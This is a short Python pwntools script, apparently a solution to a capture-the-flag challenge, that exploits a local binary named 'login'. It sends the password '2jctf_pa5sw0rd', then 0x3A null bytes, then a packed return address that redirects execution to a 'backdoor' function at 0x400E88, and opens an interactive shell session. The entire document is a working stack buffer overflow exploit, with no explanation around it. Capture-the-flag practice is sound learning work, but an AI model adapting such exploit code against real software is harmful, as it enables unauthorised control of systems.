from pwn import *

context.arch = 'amd64'
backdoor = 0x400E88

r = process('./login')

r.recvuntil('username: ')
r.sendline('admin')
r.recvuntil('password: ')
r.sendline(b'2jctf_pa5sw0rd' + b'\x00' * 0x3A + p64(backdoor))
r.recvline()
r.recvline()
r.recvline()
r.interactive()
